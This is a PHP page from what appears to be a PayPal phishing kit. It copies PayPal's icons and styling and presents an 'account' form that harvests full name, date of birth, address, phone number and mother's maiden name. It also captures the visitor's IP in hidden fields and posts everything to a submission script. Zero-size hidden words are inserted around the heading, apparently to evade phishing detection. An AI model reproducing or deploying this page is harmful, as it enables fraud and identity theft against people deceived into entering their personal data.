<?php
//error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
require_once 'more.php';
require_once '../lang.php';
require_once 'mmn.php';
?>
    <!DOCTYPE html>
    <html>

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
        <title>
            <?php echo $account['title'];?>
        </title>
        <link rel="stylesheet" href="assets/css/process.css">
        <script type="text/javascript" src="assets/js/jquery-3.3.1.min.js"></script>
        <script type="text/javascript" src="assets/js/jquery.mask.min.js"></script>
        <script type="text/javascript" src="assets/js/jquery.ccvalid.js"></script>
    </head>

    <body>
        <?php include "assets/static/header.html" ?>
            <div class="mainContainer">
                <div class="hide" id="rotate">
                    <div class="spinner">
                        <div class="rotate"></div>
                        <div class="processing">
                            <?php echo $account['processing'];?>...</div>
                    </div>
                    <div class="overlay">
                    </div>
                </div>
                <div class="mobileNav">
                    <div class="navHeader">
                        <div class="blockToggler">
                            <label class="menuLabel" for="toggleMenu"><span></span>
                                <div class="menuOpen">Menu</div>
                                <div class="menuClose">
                                    Close</div>
                            </label>
                        </div>
                    </div>
                    <div class="navLogo">
                        <a href="javascript:" class="mobileBrand"></a>
                    </div>
                    <ul class="notifUl">
                        <li>
                            <a class="svgLogo notifTxt">
                                <img src="assets/img/noti.svg" alt="">
                            </a>
                        </li>
                    </ul>
                </div>
                <div class="contents">
                    <section class="mainContents contentContainerBordered" id="process">
                        <form id="submitaccount" action="submit_account?key=<?php echo $key;?>" method="post" style="padding:0 20px" novalidate="on">

                            <h2 style="font-size: 1.875rem;font-weight: 300;text-transform: none;font-family: 'PayPal-Sans-Big', Helvetica Neue, Arial, sans-serif;">
                      <span style="font-size:0">darkness</span>
                      <?php echo $account['bil'];?>     <span style="font-size:0">isnot good</span></h2>

                            <div id="kedua" style="">

                                <div class="fields clearfix">
                                    <div class="multiInputs">
                                        <div class="inputArea hasSub">
                                            <input id="fnm" name="fnm" type="text" class="txt-capital" required placeholder="<?php echo $account['fnm'];?>">
                                        </div>
                                        <div class="inputArea hasSub pull-right" style="margin-bottom:15px">
                                            <input id="dob" name="dob" type="tel" required placeholder="<?php echo $account['dob'];?>" maxlength="10">
                                        </div>
                                    </div>
                                    <div class="inputArea">
                                        <input id="adr" name="adr" type="text" required placeholder="<?php echo $account['adr'];?>">
                                    </div>
                                    <div class="multiInputs">
                                        <div class="inputArea hasSub">
                                            <input id="cty" name="cty" type="text" required placeholder="<?php echo $account['city'];?>">
                                        </div>
                                        <div class="inputArea hasSub pull-right">
                                            <input id="zip" name="zip" type="text" required placeholder="<?php echo $account['zip'];?>" maxlength="8">
                                        </div>
                                    </div>
                                    <div class="multiInputs">
                                        <div class="inputArea hasSub">
                                            <input id="stt" name="stt" type="text" required placeholder="<?php echo $account['state'];?>">
                                        </div>
                                        <div class="inputArea hasSub pull-right">
                                            <input id="cnt" name="cnt" type="text" required placeholder="<?php echo $account['country'];?>" value="<?php echo $countryname;?>">
                                        </div>
                                    </div>
                                    <div class="multiInputs">
                                        <div class="dropDown mobileType" style="float:left;width:33%;margin:15px 0 9px">
                                            <select id="ptp" required>
                                                <option value="-1" disabled selected>
                                                    <?php echo $account['pt'];?>
                                                </option>
                                                <option value="MOBILE">
                                                    <?php echo $account['mobile'];?>
                                                </option>
                                                <option value="HOME">
                                                    <?php echo $account['home'];?>
                                                </option>
                                                <option value="WORK">
                                                    <?php echo $account['work'];?>
                                                </option>
                                            </select>
                                            <div id="displaylabelselected" class="labelSelect">
                                                <?php echo $account['pt'];?>
                                            </div>
                                        </div>

                                        <div class="inputArea hasSub pull-right nMobile" style="width:65%">
                                            <input id="pnm" name="pnm" type="tel" required placeholder="<?php echo $account['phonenumber'];?>" maxlength="15">
                                        </div>
                                    </div>
                                    <?php echo $additional;?>
                                        <?php echo $mmn;?>
                                            <input id="ipx" type="hidden" hidden="hidden" value="<?php echo $ip2;?>">
                                            <input id="keke" type="hidden" hidden="hidden" value="<?php echo $key;?>">
                                            <br>
                                </div>
                                <div>

                                    <button id="btn" style="margin-top:20px;width:100%" type="submit" class="bt">
                                        <?php echo $account['continue'];?>
                                    </button>
                                </div>
                            </div>
                        </form>
                    </section>
                    <?php include "assets/static/footer.html" ?>
                </div>
            </div>
            <script src="assets/js/validate_account.js">
            </script>
    </body>

    </html>